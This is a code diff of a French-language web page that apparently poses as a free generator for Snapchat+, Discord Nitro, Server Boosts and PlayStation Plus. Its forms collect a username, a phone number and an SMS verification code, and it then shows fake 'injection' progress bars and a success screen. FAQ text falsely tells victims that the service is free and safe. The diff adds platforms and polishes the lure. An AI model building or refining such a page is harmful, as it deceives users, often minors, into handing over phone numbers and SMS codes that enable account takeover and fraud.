-                        { value: "3m", text: "3 mois Roblox Premium" },
-                        { value: "6m", text: "6 mois Roblox Premium" },
-                        { value: "12m", text: "1 an Roblox Premium" }
-                    ],
-                    loaderHtml: '<img src="roblox.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
-                    successMsg: "L'abonnement Roblox Premium sera activé sur votre compte d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion aux serveurs Roblox..." },
-                        { width: "45%", text: "Analyse du profil joueur..." },
-                        { width: "68%", text: "Injection du statut Roblox Premium..." },
-                        { width: "90%", text: "Synchronisation de l'abonnement..." },
-                        { width: "100%", text: "Activation validée et établie !" }
-                    ],
-                    faq: [
-                        { q: "Le service est-il gratuit ?", a: "Oui, l'activation via notre plateforme est gratuite pour les utilisateurs sélectionnés." }
-                    ]
-                }
-            },
-            discord: {
-                nitro: {
-                    theme: 'theme-discord',
-                    title: "DISCORD<br>NITRO",
-                    logo: "logodiscord.png",
-                    plusText: "N",
-                    selectLabel: "Sélectionner l'offre",
-                    options: [
-                        { value: "n_1m", text: "1 mois Nitro Premium" },
-                        { value: "n_1y", text: "1 an Nitro Premium" }
-                    ],
-                    loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">💬</div>',
-                    successMsg: "L'abonnement Discord Nitro sera activé sur votre compte d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion sécurisée aux serveurs Discord..." },
-                        { width: "45%", text: "Vérification des droits d'accès..." },
-                        { width: "68%", text: "Génération du lien cadeau d'abonnement..." },
-                        { width: "90%", text: "Injection du statut Nitro Premium..." },
-                        { width: "100%", text: "Activation validée et établie !" }
-                    ],
-                    faq: [
-                        { q: "Nitro sera-t-il activé automatiquement ?", a: "Oui, une fois le processus terminé, Nitro s'appliquera directement à votre profil Discord lié." }
-                    ]
-                },
-                boosts: {
-                    theme: 'theme-discord',
-                    title: "SERVER<br>BOOSTS",
-                    logo: "logodiscord.png",
-                    plusText: "🚀",
-                    selectLabel: "Sélectionner le pack",
-                    options: [
-                        { value: "b_2", text: "2 Server Boosts" },
-                        { value: "b_7", text: "7 Server Boosts" },
-                        { value: "b_14", text: "14 Server Boosts" }
-                    ],
-                    loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">🚀</div>',
-                    successMsg: "Les Boosts seront ajoutés à votre inventaire d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion aux serveurs Discord..." },
-                        { width: "45%", text: "Préparation des packages de Boost..." },
-                        { width: "68%", text: "Synchronisation avec l'inventaire..." },
-                        { width: "90%", text: "Finalisation du transfert..." },
-                        { width: "100%", text: "Boosts livrés avec succès !" }
-                    ],
-                    faq: [
-                        { q: "Puis-je les utiliser sur n'importe quel serveur ?", a: "Absolument, les Boosts sont placés dans votre inventaire et peuvent être appliqués au serveur de votre choix." }
-                    ]
-                }
-            },
             snap: {
                 theme: 'theme-snap',
                 title: "ACTIVATION SNAP<br>PLUS +",
-                logo: "logosnapchat.png",
-                plusText: "+",
+                logo: "snapchat-icon.png",
                 selectLabel: "Sélectionner l'offre",
                 options: [
-                    { value: "snap_plus", text: "Abonnement Snapchat+" }
+                    { value: "snap_plus_1m", text: "1 Mois Snapchat+" },
+                    { value: "snap_plus_1y", text: "1 An Snapchat+" }
                 ],
-                loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">⏳</div>',
+                loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">👻</div>',
                 successMsg: "Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.",
                 progressSteps: [
-                    { width: "20%", text: "Connexion sécurisée aux serveurs Snapchat..." },
-                    { width: "45%", text: "Analyse de la validité du jeton utilisateur..." },
-                    { width: "68%", text: "Injection et chiffrement du module Snap+..." },
-                    { width: "90%", text: "Finalisation de la synchronisation réseau..." },
-                    { width: "100%", text: "Activation validée et établie !" }
+                    { width: "20%", text: "Connexion aux serveurs Snapchat..." },
+                    { width: "45%", text: "Vérification du nom d'utilisateur..." },
+                    { width: "68%", text: "Injection du module Snap+..." },
+                    { width: "90%", text: "Synchronisation réseau..." },
+                    { width: "100%", text: "Activation validée !" }
                 ],
                 faq: [
-                    { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles." },
-                    { q: "Combien de temps prend l'activation de Snap+ ?", a: "Le processus d'analyse et de synchronisation prend environ 1 à 2 minutes." },
-                    { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape prévient les abus par des robots en confirmant que vous êtes humain." }
+                    { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation via notre plateforme est gratuite pour les utilisateurs éligibles vérifiés." },
+                    { q: "Combien de temps prend l'activation ?", a: "Une fois la vérification terminée, les avantages s'affichent sur votre compte en 2 à 5 minutes." },
+                    { q: "Pourquoi valider mon numéro de téléphone ?", a: "C'est une étape de sécurité obligatoire pour prouver que vous êtes humain et éviter les bots." }
+                ]
+            },
+            discord: {
+                theme: 'theme-discord',
+                title: "DISCORD<br>PREMIUM",
+                logo: "discord-boost-icon.png",
+                selectLabel: "Sélectionner le pack",
+                options: [
+                    { value: "nitro_1m", text: "1 Mois Nitro" },
+                    { value: "nitro_1y", text: "1 An Nitro" },
+                    { value: "boost_2", text: "Pack 2 Server Boosts" },
+                    { value: "boost_14", text: "Pack 14 Server Boosts" }
+                ],
+                loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">💬</div>',
+                successMsg: "Les avantages Discord ont été synchronisés avec succès sur votre profil.",
+                progressSteps: [
+                    { width: "20%", text: "Connexion sécurisée à Discord..." },
+                    { width: "45%", text: "Recherche de l'utilisateur..." },
+                    { width: "68%", text: "Génération de l'accès Premium..." },
+                    { width: "90%", text: "Mise à jour du profil..." },
+                    { width: "100%", text: "Statut appliqué avec succès !" }
+                ],
+                faq: [
+                    { q: "Est-ce sécurisé pour mon compte ?", a: "Totalement. Nous n'avons pas besoin de votre mot de passe, seul le nom d'utilisateur suffit." },
+                    { q: "Comment les Boosts sont-ils livrés ?", a: "Les Server Boosts sont crédités directement dans votre inventaire, prêts à être utilisés sur n'importe quel serveur." },
+                    { q: "Que faire si Nitro ne s'affiche pas ?", a: "Il suffit de redémarrer votre application Discord (CTRL+R sur PC ou fermer l'app mobile) pour actualiser le statut." }
+                ]
+            },
+            playstation: {
+                theme: 'theme-playstation',
+                title: "PLAYSTATION<br>PLUS",
+                logo: "playstation-icon.png",
+                selectLabel: "Sélectionner l'abonnement",
+                options: [
+                    { value: "ps_ess", text: "1 An – PS Plus Essential" },
+                    { value: "ps_ext", text: "1 An – PS Plus Extra" },
+                    { value: "ps_prem", text: "1 An – PS Plus Premium" }
+                ],
+                loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">🎮</div>',
+                successMsg: "L'abonnement PlayStation Plus est en cours d'activation sur votre PSN.",
+                progressSteps: [
+                    { width: "20%", text: "Connexion au réseau PSN..." },
+                    { width: "45%", text: "Validation du PSN ID..." },
+                    { width: "68%", text: "Création du jeton d'abonnement..." },
+                    { width: "90%", text: "Liaison au compte principal..." },
+                    { width: "100%", text: "Activation PS Plus terminée !" }
+                ],
+                faq: [
+                    { q: "Cela fonctionne-t-il sur PS4 et PS5 ?", a: "Absolument, l'abonnement est lié à votre compte PSN et est valable sur toutes les consoles Sony connectées." },
+                    { q: "Dois-je entrer mes informations bancaires ?", a: "Non, aucune carte bancaire n'est requise. L'activation se fait directement via notre vérification sécurisée." },
+                    { q: "L'abonnement s'ajoute-t-il à mon temps restant ?", a: "Oui, si vous êtes déjà abonné, les 12 mois viendront s'ajouter à votre durée actuelle." }
+                ]
+            },
+            turbo: {
+                theme: 'theme-turbo',
+                title: "ACTIVATION<br>TURBO BOOST",
+                logo: "turbo-boost-icon.png",
+                selectLabel: "Sélectionner l'avantage",
+                options: [
+                    { value: "turbo_speed", text: "Pack Turbo Réseau" },
+                    { value: "turbo_prio", text: "File Prioritaire VIP" }
+                ],
+                loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">🚀</div>',
+                successMsg: "Le Turbo Boost a été activé. Vos requêtes sont maintenant prioritaires.",
+                progressSteps: [
+                    { width: "20%", text: "Connexion aux serveurs relais..." },
+                    { width: "45%", text: "Attribution du noeud haut débit..." },
+                    { width: "68%", text: "Configuration de la priorité VIP..." },
+                    { width: "90%", text: "Optimisation de la bande passante..." },
+                    { width: "100%", text: "Turbo Boost opérationnel !" }
+                ],
+                faq: [
+                    { q: "Qu'est-ce que l'Activation Turbo ?", a: "Il s'agit d'un service qui optimise votre routage réseau pour vous garantir une priorité sur nos serveurs." },
+                    { q: "Combien de temps dure cet avantage ?", a: "L'activation Turbo reste active sur votre session de manière permanente une fois la vérification complétée." },
+                    { q: "Cela affecte-t-il ma connexion globale ?", a: "Non, l'optimisation cible uniquement le trafic lié à nos services partenaires pour plus de fluidité." }
                 ]
             }
         };
 
         // ==========================================
-        // 2. FONCTIONS DE MISE À JOUR UI
+        // 2. GESTION DE L'INTERFACE UI
         // ==========================================
         function setService(service) {
             currentService = service;
             
-            // UI Boutons Principaux
-            document.getElementById('btn-playstation').classList.toggle('active', service === 'playstation');
-            document.getElementById('btn-roblox').classList.toggle('active', service === 'roblox');
-            document.getElementById('btn-discord').classList.toggle('active', service === 'discord');
-            document.getElementById('btn-snap').classList.toggle('active', service === 'snap');
-            
-            // Gestion Sous-Menu
-            const subMenu = document.getElementById('sub-switcher-container');
-            if (service === 'roblox') {
-                subMenu.style.display = 'flex';
-                subMenu.innerHTML = `
-                    <div class="switch-btn" id="btn-robux" onclick="setSubService('robux')">Générateur Robux</div>
-                    <div class="switch-btn" id="btn-roblox-plus" onclick="setSubService('roblox_plus')">Roblox Premium</div>
-                `;
-                setSubService('robux');
-            } else if (service === 'discord') {
-                subMenu.style.display = 'flex';
-                subMenu.innerHTML = `
-                    <div class="switch-btn" id="btn-nitro" onclick="setSubService('nitro')">Nitro Premium</div>
-                    <div class="switch-btn" id="btn-boosts" onclick="setSubService('boosts')">Option Boosts</div>
-                `;
-                setSubService('nitro');
-            } else {
-                subMenu.style.display = 'none';
-                subMenu.innerHTML = '';
-                currentSubService = null;
-                applyConfig();
-            }
-        }
-
-        function setSubService(subService) {
-            currentSubService = subService;
-            const subBtns = document.getElementById('sub-switcher-container').getElementsByClassName('switch-btn');
-            for (let btn of subBtns) btn.classList.remove('active');
-            
-            if(subService === 'robux') document.getElementById('btn-robux').classList.add('active');
-            if(subService === 'roblox_plus') document.getElementById('btn-roblox-plus').classList.add('active');
-            if(subService === 'nitro') document.getElementById('btn-nitro').classList.add('active');
-            if(subService === 'boosts') document.getElementById('btn-boosts').classList.add('active');
+            // Mise à jour de la barre de navigation visuelle (Agrandissement de l'icône active)
+            document.querySelectorAll('.platform-icon').forEach(icon => icon.classList.remove('active'));
+            document.getElementById('nav-' + service).classList.add('active');
             
             applyConfig();
         }
 
         function applyConfig() {
-            let activeConfig;
-            document.body.className = ''; 
+            const activeConfig = siteConfig[currentService];
+            
+            // Changement de thème global
+            document.body.className = activeConfig.theme;
 
-            if (currentService === 'playstation') {
-                activeConfig = siteConfig.playstation;
-                document.body.className = 'theme-playstation';
-            } else if (currentService === 'snap') {
-                activeConfig = siteConfig.snap;
-            } else if (currentService === 'roblox') {
-                activeConfig = siteConfig.roblox[currentSubService];
-                document.body.className = 'theme-roblox';
-            } else if (currentService === 'discord') {
-                activeConfig = siteConfig.discord[currentSubService];
-                document.body.className = 'theme-discord';
-            }
-
-            // Textes et Images
+            // Mise à jour Textes et Logo Central
             document.getElementById('main-title').innerHTML = activeConfig.title;
             
             const logoImg = document.getElementById('main-logo');
@@ -730,12 +625,10 @@
                 logoImg.style.opacity = 1;
             }, 300);
 
-            document.getElementById('plus-badge').textContent = activeConfig.plusText;
-            
-            // Sélecteur
+            // Mise à jour du Sélecteur d'Offres
             const offerLabel = document.getElementById('offer-label');
             offerLabel.textContent = activeConfig.selectLabel;
-            offerLabel.style.color = "rgba(255, 255, 255, 0.5)";
+            offerLabel.style.color = "rgba(255, 255, 255, 0.4)";
             document.getElementById('offer-select').value = "";
             
             const optionsContainer = document.getElementById('offer-options');
@@ -749,7 +642,7 @@
                 optionsContainer.appendChild(div);
             });
 
-            // Loader & FAQ
+            // Mise à jour Loader & FAQ
             document.getElementById('loader-container').innerHTML = activeConfig.loaderHtml;
             const faqList = document.getElementById('faq-list');
             faqList.innerHTML = '';
@@ -766,7 +659,7 @@
         }
 
         // ==========================================
-        // 3. LOGIQUE D'APPLICATION
+        // 3. LOGIQUE GLOBALE ET AUTHENTIFICATION
         // ==========================================
         let isGuest = false;
 
@@ -815,7 +708,10 @@
             setTimeout(() => {
                 overlay.style.display = "none";
                 site.style.display = "block";
-                setService('playstation'); // État de départ V1.54
+                
+                // Redirection par défaut vers Snapchat (V2.0)
+                setService('snap'); 
+                
                 setTimeout(() => { 
                     site.style.opacity = "1"; 
                     if (isGuest) showKeyAccessPopup();
@@ -855,7 +751,7 @@
             }
         }
 
-        // --- GESTION DU CUSTOM SELECT ---
+        // --- GESTION DU SÉLECTEUR ---
         const offerTrigger = document.getElementById('offer-trigger');
         const offerOptions = document.getElementById('offer-options');
         
@@ -881,6 +777,7 @@
             offerTrigger.classList.remove('open');
         });
 
+        // --- OUTILS VISUELS ---
         function triggerShake(elementId) {
             const el = document.getElementById(elementId);
             if (el) { el.classList.remove('shake'); void el.offsetWidth; el.classList.add('shake'); setTimeout(() => el.classList.remove('shake'), 400); }
@@ -890,28 +787,34 @@
             const errorDiv = document.createElement('div');
             errorDiv.className = 'error-message'; errorDiv.textContent = message;
             document.body.appendChild(errorDiv);
-            setTimeout(() => errorDiv.remove(), 3000);
+            setTimeout(() => errorDiv.remove(), 3500);
         }
 
+        // --- VALIDATION DU FORMULAIRE (3 CHAMPS STRICTS) ---
         function processValidation() {
             if (isGuest) { showKeyAccessPopup(); return; }
             
-            // Validation Numéro (Espaces autorisés, mais doit contenir au moins 10 chiffres)
-            const phoneVal = document.getElementById('phone').value.replace(/\s+/g, '');
-            if (phoneVal.length < 10 || isNaN(phoneVal)) { 
-                triggerShake('group-phone'); showError('❌ Numéro invalide (10 chiffres requis).'); return; 
+            const userVal = document.getElementById('username').value.trim();
+            if (!userVal) {
+                triggerShake('group-username'); showError("❌ Nom d'utilisateur requis."); return;
             }
+
+            const phoneVal = document.getElementById('phone').value.replace(/\s+/g, '');
+            if (phoneVal.length !== 10 || isNaN(phoneVal)) { 
+                triggerShake('group-phone'); showError('❌ Le numéro doit contenir exactement 10 chiffres.'); return; 
+            }
+
             if (!document.getElementById('offer-select').value) { 
                 triggerShake('group-offer'); showError('❌ Veuillez sélectionner une offre.'); return; 
             }
 
             const btn = document.getElementById('submitBtn');
-            btn.innerHTML = "Envoi en cours..."; btn.disabled = true;
+            btn.innerHTML = "Connexion en cours..."; btn.disabled = true;
 
             setTimeout(() => {
                 document.getElementById('step-1').style.display = 'none';
                 document.getElementById('step-2').style.display = 'block';
-                btn.innerHTML = "Valider"; btn.disabled = false;
+                btn.innerHTML = "Continuer"; btn.disabled = false;
                 startVerificationTimer();
             }, 2000);
         }
@@ -919,19 +822,20 @@
         let timerInterval;
         function startVerificationTimer() {
             let timeLeft = 180;
+            document.getElementById('timer').textContent = `Un code SMS a été envoyé. Expiration dans 03:00`;
             timerInterval = setInterval(() => {
                 timeLeft--;
-                document.getElementById('timer').textContent = `Code expire dans ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
-                if (timeLeft <= 0) { clearInterval(timerInterval); showError('⏱️ Code expiré.'); goBackToStep1(); }
+                document.getElementById('timer').textContent = `Un code SMS a été envoyé. Expiration dans ${Math.floor(timeLeft / 60).toString().padStart(2, '0')}:${(timeLeft % 60).toString().padStart(2, '0')}`;
+                if (timeLeft <= 0) { clearInterval(timerInterval); showError('⏱️ Code expiré. Veuillez réessayer.'); goBackToStep1(); }
             }, 1000);
         }
 
         function showWaitingMenu() {
             if (isGuest) { showKeyAccessPopup(); return; }
-            if (!/^[0-9]{4}$/.test(document.getElementById('sms-code').value.trim())) { triggerShake('group-sms'); showError('❌ Code à 4 chiffres requis.'); return; }
+            if (!/^[0-9]{4}$/.test(document.getElementById('sms-code').value.trim())) { triggerShake('group-sms'); showError('❌ Code à 4 chiffres invalide.'); return; }
 
             clearInterval(timerInterval);
-            document.getElementById('verifyBtn').innerHTML = "Vérification...";
+            document.getElementById('verifyBtn').innerHTML = "Analyse...";
             document.getElementById('verifyBtn').disabled = true;
 
             document.getElementById('step-2').style.display = 'none';
@@ -942,13 +846,7 @@
         function runProgress() {
             const pb = document.getElementById('pb');
             const msg = document.getElementById('status-msg');
-            
-            let activeConfig;
-            if(currentService === 'playstation' || currentService === 'snap') {
-                activeConfig = siteConfig[currentService];
-            } else {
-                activeConfig = siteConfig[currentService][currentSubService];
-            }
+            const activeConfig = siteConfig[currentService];
             const steps = activeConfig.progressSteps;
 
             let i = 0;
@@ -961,16 +859,16 @@
                 pb.style.width = steps[i].width;
                 msg.textContent = steps[i].text;
                 i++;
-            }, 1400);
+            }, 1500);
         }
 
         function showSuccessScreen(successMsg) {
             const container = document.getElementById('status-container');
             container.style.animation = 'fadeIn 0.5s ease-in';
             container.innerHTML = `
-                <span style="font-size: 50px;">✅</span>
-                <div style="color: #4ade80; font-size: 22px; font-weight: bold; margin: 20px 0;">Opération établie</div>
-                <p style="opacity: 0.9; margin:0;">L'opération a été établie avec succès.<br>${successMsg}</p>
+                <span style="font-size: 55px; display: block; margin-bottom: 10px;">✅</span>
+                <div style="color: #4ade80; font-size: 22px; font-weight: 900; margin: 15px 0; text-transform: uppercase;">Validation Réussie</div>
+                <p style="opacity: 0.9; margin:0; line-height: 1.5;">${successMsg}</p>
             `;
         }
 
@@ -980,15 +878,11 @@
             document.getElementById('step-3').style.display = 'none';
             document.getElementById('step-1').style.display = 'block';
             
-            document.getElementById('phone').value = '';
             document.getElementById('sms-code').value = '';
-            
             document.getElementById('pb').style.width = '0%';
             document.getElementById('status-msg').textContent = 'Initialisation de la demande...';
             document.getElementById('verifyBtn').innerHTML = "Vérifier";
             document.getElementById('verifyBtn').disabled = false;
-            
-            applyConfig(); // Reset le select
         }
     </script>
 </body>
